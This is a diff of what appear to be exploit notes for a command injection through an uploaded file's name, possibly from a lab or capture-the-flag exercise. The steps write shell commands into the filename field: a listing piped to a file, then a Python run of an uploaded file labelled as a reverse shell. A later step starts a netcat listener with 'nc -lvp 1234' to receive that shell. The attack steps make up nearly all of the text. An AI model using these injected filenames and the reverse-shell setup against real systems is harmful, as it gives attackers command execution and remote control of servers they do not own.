@@ -200,17 +200,16 @@ Content-Disposition: form-data; name="card_fname"
 -----------------------------243619571321209919733622682574--
 
 
-Check for name of file
-
-reverse_8_parser.gftcrd
+3)Check for name of file
 
 FileName: test3;ls -la |tee tmp_file# ; output found in <td>s</td>
 
 
-Execute Reverse Shell
+4) Execute Reverse Shell
 
 Filename: test3;python3 reverse_8_parser.gftcrd & #
-
+- need to run "nc -lvp 1234" in a separate prompt before this last 
+step
 
 
 
